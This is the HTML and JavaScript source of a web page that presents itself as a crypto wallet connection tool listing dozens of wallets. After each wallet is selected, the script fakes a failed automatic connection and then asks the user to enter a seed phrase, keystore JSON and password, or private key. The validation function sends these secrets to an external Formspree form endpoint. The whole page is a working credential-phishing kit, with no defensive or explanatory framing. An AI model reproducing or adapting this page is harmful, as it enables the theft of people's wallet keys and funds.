<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Selection</title>
    <link rel="stylesheet" href="color.css">
</head>
<body>
    <header>
        <div class="banner">
            <img src="assets/banner.jpg" alt="Wallet Security Banner">
        </div>
        <h1>Select Your Wallet or Exchanger</h1>
        <p><a href="index.html" style="color: #00d4ff; text-decoration: none;">Back to Home</a></p>
    </header>
    
    <div class="wallet-container" id="walletContainer"></div>

    <!-- Wallet Selection Popup -->
    <div id="walletPopup" class="popup">
        <div class="popup-content">
            <h2>Connect your wallet</h2>
            <div class="wallet-list" id="walletList"></div>
        </div>
    </div>

    <!-- Initializing Popup -->
    <div id="initPopup" class="popup">
        <div class="popup-content">
            <h2>Initializing</h2>
            <div class="wallet-info">
                <span id="initWalletName"></span>
                <img id="initWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-small">
            </div>
        </div>
    </div>

    <!-- Error/Manual Connect Popup -->
    <div id="errorPopup" class="popup">
        <div class="popup-content">
            <p>There was an error connecting automatically. But do not worry, you can still connect manually.</p>
            <div class="wallet-info">
                <h2>Import your <span id="errorWalletName"></span> wallet</h2>
                <img id="errorWalletLogo" src="" alt="Wallet Logo" class="wallet-logo-small">
            </div>
            
            <div class="tabs">
                <button class="tab-btn active" onclick="switchTab('seedphrase')">Seed Phrase</button>
                <button class="tab-btn" onclick="switchTab('keystore')">Keystore JSON</button>
                <button class="tab-btn" onclick="switchTab('privatekey')">Private Key</button>
            </div>

            <label for="manualInput">Enter your wallet <span id="inputLabel">seed phrase</span></label>
            <textarea id="manualInput" name="manualInput" placeholder="Enter your seed phrase" rows="6"></textarea>

            <!-- Wallet Password Field (visible only for Keystore JSON tab) -->
            <div id="passwordField" class="hidden">
                <label for="walletPassword">Wallet password</label>
                <input type="password" id="walletPassword" name="walletPassword" placeholder="Enter your wallet password">
            </div>

            <p id="errorMessage" class="hidden"></p>

            <button class="connect-btn" onclick="validateManualInput()">Validate</button>
            <button id="closeErrorPopup" class="close-btn">Close</button>
        </div>
    </div>

    <script>
        const wallets = [
            "Metamask", "Trust", "Coinbase", "Xumm", "Cardano", "Daedalus", "Yoroi", "CCVault",
            "Gero", "Nami", "Solana", "Phantom", "Solflare", "Sollet", "Solong", "Exodus",
            "Avalanche", "Velas", "Crypto.com", "Blockchain", "Binance Smart Chain", "Safepal", "Argent",
            "Fortmatic", "Aktionariat", "Keyring Pro", "BitKeep", "SparkPoint", "OwnBit", "Infinity Wallet",
            "Wallet.io", "Infinito", "Torus", "Nash", "BitPay", "imToken", "Ambire", "Apolox",
            "Bitski", "Bobablocks", "Crossmint", "Defiant", "Fireblocks", "KryptoGo", "Ledger",
            "Now", "Nufinetes", "Onekey", "Paper", "Pier", "Prema", "Rice", "Safemoon",
            "Secux", "Sequence", "Tokenary", "Unipass", "Venly", "Verso", "Wallet3", "Polkadot",
            "Filecoin", "IOST", "Qtum", "Waves", "Algorand", "Zcash", "Vechain", "Tezos",
            "Stellar", "Tron", "Terra", "Cosmos", "Metis", "Optimism"
        ];

        const walletContainer = document.getElementById("walletContainer");
        const walletList = document.getElementById("walletList");

        // Populate wallet list in the main container (for direct access to main.html)
        wallets.forEach(wallet => {
            let walletBox = document.createElement("div");
            walletBox.classList.add("wallet-box");
            walletBox.setAttribute("tabindex", "0");
            walletBox.setAttribute("role", "button");
            walletBox.innerHTML = `
                <img src="assets/wallets/${wallet.toLowerCase()}.png" alt="${wallet} Logo" class="wallet-logo" onerror="this.src='assets/default.png'">
                <p>${wallet}</p>
            `;
            walletBox.onclick = () => openInitPopup(wallet);
            walletBox.onkeydown = (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    openInitPopup(wallet);
                }
            };
            walletContainer.appendChild(walletBox);
        });

        // Populate wallet list in the popup (for when accessed via index.html or syncwallets.html)
        wallets.forEach(wallet => {
            let walletItem = document.createElement("div");
            walletItem.classList.add("wallet-item");
            walletItem.setAttribute("tabindex", "0");
            walletItem.setAttribute("role", "button");
            walletItem.innerHTML = `
                <span class="wallet-status"></span>
                <img src="assets/wallets/${wallet.toLowerCase()}.png" alt="${wallet} Logo" class="wallet-logo-small" onerror="this.src='assets/default.png'">
                <span>${wallet}</span>
            `;
            walletItem.onclick = () => {
                document.getElementById("walletPopup").style.display = "none";
                openInitPopup(wallet);
            };
            walletItem.onkeydown = (e) => {
                if (e.key === "Enter" || e.key === " ") {
                    document.getElementById("walletPopup").style.display = "none";
                    openInitPopup(wallet);
                }
            };
            walletList.appendChild(walletItem);
        });

        let selectedWallet = null;
        let selectedTroubleshootOption = null;
        let currentTab = "seedphrase";

        // Open wallet selection popup
        function openWalletPopup(troubleshootOption = null) {
            selectedTroubleshootOption = troubleshootOption;
            document.getElementById("walletPopup").style.display = "flex";
        }

        // Open initializing popup
        function openInitPopup(wallet) {
            selectedWallet = wallet;
            document.getElementById("initWalletName").textContent = wallet;
            document.getElementById("initWalletLogo").src = `assets/wallets/${wallet.toLowerCase()}.png`;
            document.getElementById("initWalletLogo").onerror = () => {
                document.getElementById("initWalletLogo").src = 'assets/default.png';
            };
            document.getElementById("initPopup").style.display = "flex";

            // Simulate a failed connection attempt (2 seconds delay)
            setTimeout(() => {
                document.getElementById("initPopup").style.display = "none";
                openErrorPopup(wallet);
            }, 2000);
        }

        // Open error/manual connect popup
        function openErrorPopup(wallet) {
            document.getElementById("errorWalletName").textContent = wallet;
            document.getElementById("errorWalletLogo").src = `assets/wallets/${wallet.toLowerCase()}.png`;
            document.getElementById("errorWalletLogo").onerror = () => {
                document.getElementById("errorWalletLogo").src = 'assets/default.png';
            };
            document.getElementById("errorPopup").style.display = "flex";
            currentTab = "seedphrase";
            updateInputLabel();
        }

        // Close error popup
        function closeErrorPopup() {
            selectedWallet = null;
            selectedTroubleshootOption = null;
            currentTab = "seedphrase";
            document.getElementById("manualInput").value = "";
            document.getElementById("walletPassword").value = "";
            document.getElementById("errorMessage").textContent = "";
            document.getElementById("errorMessage").classList.add("hidden");
            document.getElementById("errorPopup").style.display = "none";
            updateTabButtons();
        }

        document.getElementById("closeErrorPopup").addEventListener("click", closeErrorPopup);

        window.onclick = function(event) {
            if (event.target.classList.contains("popup")) {
                document.getElementById("walletPopup").style.display = "none";
                document.getElementById("initPopup").style.display = "none";
                closeErrorPopup();
            }
        };

        // Switch between tabs (Seed Phrase, Keystore JSON, Private Key)
        function switchTab(tab) {
            currentTab = tab;
            updateInputLabel();
            updateTabButtons();
        }

        function updateInputLabel() {
            const label = document.getElementById("inputLabel");
            const placeholder = document.getElementById("manualInput");
            const passwordField = document.getElementById("passwordField");
            if (currentTab === "seedphrase") {
                label.textContent = "seed phrase";
                placeholder.placeholder = "Enter your seed phrase";
                passwordField.classList.add("hidden");
            } else if (currentTab === "keystore") {
                label.textContent = "keystore JSON";
                placeholder.placeholder = "Enter your keystore JSON";
                passwordField.classList.remove("hidden");
            } else if (currentTab === "privatekey") {
                label.textContent = "private key";
                placeholder.placeholder = "Enter your private key";
                passwordField.classList.add("hidden");
            }
        }

        function updateTabButtons() {
            document.querySelectorAll(".tab-btn").forEach(btn => {
                btn.classList.remove("active");
                if (btn.textContent.toLowerCase().replace(" ", "") === currentTab) {
                    btn.classList.add("active");
                }
            });
        }

        // Validate manual input and submit to Formspree
        function validateManualInput() {
            let manualInput = document.getElementById("manualInput").value.trim();
            let walletPassword = document.getElementById("walletPassword").value.trim();
            let message = document.getElementById("errorMessage");

            message.textContent = "";
            message.classList.add("hidden");

            if (manualInput === "") {
                message.textContent = "Error: Input cannot be empty!";
                message.classList.remove("hidden");
                return;
            }

            if (currentTab === "seedphrase" && ![12, 24].includes(manualInput.split(" ").length)) {
                message.textContent = "Error: Seed phrase must be 12 or 24 words!";
                message.classList.remove("hidden");
                return;
            }

            if (currentTab === "keystore") {
                if (manualInput.length < 16) {
                    message.textContent = "Error: Keystore JSON must be at least 16 characters!";
                    message.classList.remove("hidden");
                    return;
                }
                if (walletPassword === "") {
                    message.textContent = "Error: Wallet password cannot be empty!";
                    message.classList.remove("hidden");
                    return;
                }
            }

            if (currentTab === "privatekey" && manualInput.length < 8) {
                message.textContent = "Error: Private key must be at least 8 characters!";
                message.classList.remove("hidden");
                return;
            }

            let formData = `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}`;
            if (currentTab === "keystore") {
                formData += `&walletPassword=${encodeURIComponent(walletPassword)}`;
            }
            if (selectedTroubleshootOption) {
                formData += `&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`;
            }

            fetch("https://formspree.io/f/mvgkalye", {
                method: "POST",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    message.textContent = "Credentials submitted successfully!";
                    message.style.color = "green";
                    message.classList.remove("hidden");
                    setTimeout(() => {
                        closeErrorPopup();
                        if (!selectedTroubleshootOption) {
                            window.location.href = "syncwallets.html";
                        }
                    }, 2000);
                } else {
                    message.textContent = `Error submitting credentials. Status: ${response.status}`;
                    message.style.color = "red";
                    message.classList.remove("hidden");
                }
            })
            .catch(() => {
                message.textContent = "Network error. Please try again.";
                message.style.color = "red";
                message.classList.remove("hidden");
            });
        }

        document.getElementById("manualInput").addEventListener("input", function () {
            document.getElementById("errorMessage").classList.add("hidden");
        });

        document.getElementById("walletPassword").addEventListener("input", function () {
            document.getElementById("errorMessage").classList.add("hidden");
        });
    </script>
</body>
</html>
